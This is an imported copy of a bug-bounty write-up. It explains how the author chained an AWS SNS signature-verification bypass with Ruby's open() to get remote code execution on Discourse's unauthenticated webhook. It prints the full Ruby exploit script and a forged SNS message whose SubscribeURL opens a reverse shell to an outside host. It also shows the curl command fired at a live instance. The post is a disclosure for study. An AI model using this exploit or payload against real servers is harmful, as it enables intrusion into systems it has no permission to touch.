---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-10-23_discourse-sns-webhook-rce.md
original_filename: 2021-10-23_discourse-sns-webhook-rce.md
title: Discourse SNS webhook RCE
category: documents
detected_topics:
- command-injection
- cloud-security
- xss
- path-traversal
- otp
- automation-abuse
tags:
- imported
- documents
- command-injection
- cloud-security
- xss
- path-traversal
- otp
- automation-abuse
language: en
raw_sha256: fcfeccbf8506e7ab53c976d00db7372b76ba0a2710882026d99115cfa4b2a521
text_sha256: b9f6a37264d4e0c0cafefa0e2f4dd8dd0ee18bebc5012df2ec64c0ca13cc08d4
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: true
---

# Discourse SNS webhook RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-10-23_discourse-sns-webhook-rce.md
- Source Type: markdown
- Detected Topics: command-injection, cloud-security, xss, path-traversal, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: True
- Raw SHA256: `fcfeccbf8506e7ab53c976d00db7372b76ba0a2710882026d99115cfa4b2a521`
- Text SHA256: `b9f6a37264d4e0c0cafefa0e2f4dd8dd0ee18bebc5012df2ec64c0ca13cc08d4`


## Content

---
title: "Discourse SNS webhook RCE"
page_title: "Discourse SNS webhook RCE :: 0day.click"
url: "https://0day.click/recipe/discourse-sns-rce/"
final_url: "https://0day.click/recipe/discourse-sns-rce/"
authors: ["joernchen (@joernchen)"]
programs: ["Discourse"]
bugs: ["RCE", "Signature validation bypass"]
publication_date: "2021-10-23"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3221
---

#  [Discourse SNS webhook RCE](https://0day.click/recipe/discourse-sns-rce/)

2021-10-23

I was staring at [this part](https://github.com/discourse/discourse/blob/1472e47aae5bfdfb6fd9abfe89beb186c751f514/app/jobs/regular/confirm_sns_subscription.rb#L17) of the code for way too long already:
  
  
  module Jobs
  
  class ConfirmSnsSubscription < ::Jobs::Base
  sidekiq_options retry: false
  
  def execute(args)
  return unless raw = args[:raw].presence
  return unless json = args[:json].presence
  return unless subscribe_url = json["SubscribeURL"].presence
  
  require "aws-sdk-sns"
  return unless Aws::SNS::MessageVerifier.new.authentic?(raw)
  
  # confirm subscription by visiting the URL
  open(subscribe_url)
  end
  
  end
  
  end
  

The above code is an excerpt from [Discourse](https://www.discourse.org/)’s AWS notification webhook handler. This handler can be triggered without further authentication under `https://somedicourseinstance/webhooks/aws`. In the above code `args[:raw]` is the raw POST body and `args[:json]` is the POST body but parsed as JSON.

The call to `open` with some external input delivered via a webhook was really bothering me for quite a while.

![brain meme](../brain.jpg)

When calling [`open`](https://ruby-doc.org/core-3.0.2/Kernel.html#method-i-open) with attacker supplied input this can easily lead to OS command execution. Having a payload of `open("|somecommand")` it will call `somecommand` on the shell for us.

The thing here is: the payload has to be [signed by AWS](https://docs.aws.amazon.com/sns/latest/dg/sns-verify-signature-of-message.html). This verification is what the call to `Aws::SNS::MessageVerifier.new.authentic?` does for us. In order to not only give AWS a free shell on any given Discourse instance, but also me I needed a bypass to this signature check to also be able to invoke commands ;D.

Let’s get an overview of [what checks](https://github.com/aws/aws-sdk-ruby/blob/f6b425e97a393a8229c0bdc149d2f05529039a29/gems/aws-sdk-sns/lib/aws-sdk-sns/message_verifier.rb) are in place to verify the signature:
  
  
  AWS_HOSTNAMES = [
  /^sns\.[a-zA-Z0-9\-]{3,}\.amazonaws\.com(\.cn)?$/
  ].freeze
  [...]
  def authentic?(message_body)
  authenticate!(message_body)
  rescue VerificationError
  false
  end
  [...]
  def authenticate!(message_body)
  msg = Json.load(message_body)
  msg = convert_lambda_msg(msg) if is_from_lambda(msg)
  if public_key(msg).verify(sha1, signature(msg), canonical_string(msg))
  true
  else
  msg = 'the authenticity of the message cannot be verified'
  raise VerificationError, msg
  end
  end
  [...]
  def public_key(message)
  x509_url = URI.parse(message['SigningCertURL'])
  x509 = OpenSSL::X509::Certificate.new(pem(x509_url))
  OpenSSL::PKey::RSA.new(x509.public_key)
  end
  
  def pem(uri)
  if @cached_pems[uri.to_s]
  @cached_pems[uri.to_s]
  else
  @cached_pems[uri.to_s] = download_pem(uri)
  end
  end
  
  def download_pem(uri)
  verify_uri!(uri)
  https_get(uri)
  end
  
  def verify_uri!(uri)
  verify_https!(uri)
  verify_hosted_by_aws!(uri)
  verify_pem!(uri)
  end
  
  def verify_https!(uri)
  unless uri.scheme == 'https'
  msg = "the SigningCertURL must be https, got: #{uri}"
  raise VerificationError, msg
  end
  end
  
  def verify_hosted_by_aws!(uri)
  unless AWS_HOSTNAMES.any? { |pattern| pattern.match(uri.host) }
  msg = "signing cert is not hosted by AWS: #{uri}"
  raise VerificationError, msg
  end
  end
  
  def verify_pem!(uri)
  unless File.extname(uri.path) == '.pem'
  msg = "the SigningCertURL must link to a .pem file"
  raise VerificationError, msg
  end
  end
  

The above excerpts are the relevant code pieces we need to keep in mind. The main verifications are around the PEM which signs the actual SNS message. TL;DR:

The `SigningCertURL` which hosts the PEM file needs to:

  1. Have a HTTPS URL
  2. Be hosted on a host matching the regex: `/^sns\.[a-zA-Z0-9\-]{3,}\.amazonaws\.com(\.cn)?$/`
  3. Be on a path ending with the extension `.pem`

I stared at the code for quite a while but there seemed no way around those requirements. So I began to look at the [SNS service](https://docs.aws.amazon.com/sns/latest/dg/welcome.html) itself. This service is intended to push messages to various registered endpoints. The code above taken from the `ConfirmSnsSubscription` class is implementing a response to acknowledge the sign up for SNS messages in Discourse. To acknowledge this the `SubscribeURL` needs to be visited, this is exactly what the call to `open(subscribe_url)` does and this is exactly the data I was interested in controlling for the sake of RCE :).

But now back to the AWS part of the SNS service. I signed into the AWS console and took a look at the SNS service from there. I briefly messed around and sent some messages. The `SigningCertURL` parameter was pointing to a `.pem` with the following URL:
  
  
  https://sns.us-east-1.amazonaws.com/SimpleNotificationService-7ff5318490ec183fbaddaa2a969abfda.pem
  

This obviously matched the above conditions to pass the checks for the signature. But I also noticed that any other [SNS operation](https://docs.amazonaws.cn/sns/latest/api/API_Operations.html) would be hosted on `sns.us-east-1.amazonaws.com` too.

Slowly a plan came together. I could make the API reflect a X509 certificate wrapped in a error message by using a URL like:
  
  
  https://sns.us-west-2.amazonaws.com/?Action=%0a-----BEGIN%20CERTIFICATE-----%0aMIIDazCCAlOgAwIBAgIUM7yqYp04Ts97K+y+EuBxt8XKt0AwDQYJKoZIhvcNAQEL%0aBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM%0aGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMTEwMTAwNzI3MjNaFw0yMjEw%0aMTAwNzI3MjNaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw%0aHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB%0aAQUAA4IBDwAwggEKAoIBAQDQUNsJkZiRneoOTCkGXQmMPn7XzMfjlTxII3z68i6L%0aIGBSGxRcNh5rdcH62ao1c7trhKw259WSqMHI0+WxvypsivixxpWOfaLlNz7j1OmZ%0asweTwjvRyHIg6mlegGSLyK43LD4L66n9dZAMB2NVt6aHs67M4XsDD44goUWE2Gza%0aMN7lFkJoqLIqxSsJLQxDRlUinncbfK78BQOQgRMcdtXL2ryIxYLesLLk8S3zg/Go%0aL2HqfbEF4dJGdjm+PgQFFV7q0lFbcubO1hg5rCPzr4pXUtwYXyki5qPrhTQfo/QG%0a7wV/Ny4c+zs2we8hLFlxriHertRYIqauu39FIfL4aewRAgMBAAGjUzBRMB0GA1Ud%0aDgQWBBSh0BVXFXwIs1yG3o47v/oNunGoXDAfBgNVHSMEGDAWgBSh0BVXFXwIs1yG%0a3o47v/oNunGoXDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQDH%0ajvTKw/QBtr+3Fdfx98kmiPB0G5mDUN1QTv0y4H0fRw2qhgWBCOhxmH7MEpHPw87Y%0a78s7411fagPDXCr/9CtmKUWeew3Mzz2O+ItsT7k5qGo3LbsCLrepH487ba5ESAY9%0aUnRxXdDL3yJAmqUK0fz1o2RYnYgX+iODSa2cb+AII2B3PhT0bFDgtY6Tf8zFz0DC%0axs2yXJr5E8Ez8BOap6/1C27sfSCmRPV6x7vWf12fbZv8bMcJDvyrN6o5qV++2zdH%0a07WIWM0OWPWIGomaB29+yDHHMV/HCyuJW7SxZGfo8mUtBj2O+W+hDWeSfS2NsBbT%0aqo/U1n7I8IwThABS/z2h%0a-----END%20CERTIFICATE-----%0a
  

This looked as follows:

![injected cert](../injected_cert.png)

I crossed my fingers an checked Ruby’s `OpenSSL::X509::Certificate.new` manually. Luckily that method would ignore the surrounding XML and just parse out my certificate embedded in the errormessage from `sns.us-east-1.amazonaws.com`. But the `.pem` extension is not fulfilled by this path. Taking a deep breath and being pleasantly surprised:

The host would respond to arbitrary file names with the same response as with requests to `/`. So the URLs `https://sns.us-west-2.amazonaws.com/?Action=FOO` and `https://sns.us-west-2.amazonaws.com/LOL.wat.pem?Action=FOO` seemed to do the very same thing, meaning we can get past the `.pem` file extension restriction.

One last thing now stopped the bypass to work:
  
  
  def https_get(uri, failed_attempts = 0)
  args = []
  args << uri.host
  args << uri.port
  args += http_proxy_parts
  http = Net::HTTP.new(*args.compact)
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_PEER
  http.start
  resp = http.request(Net::HTTP::Get.new(uri.request_uri))
  http.finish
  if resp.code == '200'
  resp.body
  else
  [...] 
  

We’d need a `200` response from the server, but the X509 injected in the error message would give us a status of `400`. Still really too close but not yet true, so I digged deeper in the AWS console and the SNS documentation. The [`GetEndpointAttributes`](https://docs.amazonaws.cn/sns/latest/api/API_GetEndpointAttributes.html) method sparked my interest a lot as it allowed to have `CustomUserData`. So I poked the AWS console a bit struggling to find the right settings. But finally I was able to creat such an endpoint which holds a X509 certificate as custom data:

![screenshot](../endpoint.png)

The URL to this data [needs to be signed](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_sigv.html) as it’s an AWS API operation.

Putting all this together the full exploit looked like this:
  
  
  require 'aws-sdk-signer'
  require 'openssl'
  require 'json'
  
  key = OpenSSL::PKey::RSA.new(File.read("server.key"))
  cert = OpenSSL::X509::Certificate.new(File.read("server.crt"))
  
  SIGNABLE_KEYS = [ 
  'Message',
  'MessageId',
  'Subject',
  'SubscribeURL',
  'Timestamp',
  'Token',
  'TopicArn',
  'Type'
  ].freeze
  
  def canonical_string(message)
  parts = []
  SIGNABLE_KEYS.each do |key|
  value = message[key]
  unless value.nil? or value.empty?
  parts << "#{key}\n#{value}\n"
  end
  end
  parts.join
  end
  
  
  signer = Aws::Sigv4::Signer.new(
  service: 'sns',
  region: 'us-east-1',
  access_key_id: ENV["***REDACTED-AWS-KEY***_ID"],
  secret_access_key: ENV["***REDACTED-AWS-KEY***_ACCESS_KEY"]
  )
  
  url = signer.presign_url(
  http_method: 'GET',
  url: 'https://sns.us-east-1.amazonaws.com/x.pem?Action=GetEndpointAttributes&EndpointArn=arn%3Aaws%3Asns%3Aus-east-1%3A438937529581%3Aendpoint%2FBAIDU%2Fxxx%2F63cbfc62-1ffe-3dae-ab8a-3b301f2a7e03',
  expires_in: 60
  )
  
  puts url
  msg = JSON.load <<END
  {
  "Type" : "SubscriptionConfirmation",
  "MessageId" : "0d5f8053-1356-4eef-bc68-4ff0cf1cf61e",
  "SubscribeURL" : "|ruby -rsocket -e'f=TCPSocket.open(\\u0022myhost\\u0022,443);spawn(\\u0022/bin/sh\\u0022,[0,1,2]=>f)'",
  "SignatureVersion" : "1"
  }
  END
  
  sig = Base64.strict_encode64(key.sign(OpenSSL::Digest::SHA1.new, canonical_string(msg)))
  msg["Signature"] = sig
  msg["SigningCertURL"] = url
  puts JSON.dump(msg)
  

The output of that script is a JSON string which will let us get past `Aws::SNS::MessageVerifier.new.authentic?(raw)` in the Discourse codebase and thus allowing RCE with the `SubscribeURL` value. After verifying the signature locally I gave it a shot against `try.discourse.org` like so with the signed JSON in the `payload` file:
  
  
  curl -X POST https://try.discourse.org/webhooks/aws --data @payload
  

It worked I got a shell and left a note in `/tmp/bugbounty.txt`. Afterwards I reported to the Discourse project and AWS.

My takeaways of this whole thing are:

  * Two little quirks (Ruby’s forgiving X509 parsing and the forgiving AWS responding to non-existent paths) might be enough to get a shell somewhere :)
  * It pays off to dig deeper, on a first glance I might have given up because “it’s signed!”
  * It’s worth to have a look a things beyond the pure code as code always lives within some context

* * *

[ < [RCE via LDAP truncation on hg.mozilla.org] ](https://0day.click/recipe/pash/) :: [ [Discourse themes OS Command Injection] > ](https://0day.click/recipe/2021-04-18-discourse-themes/)
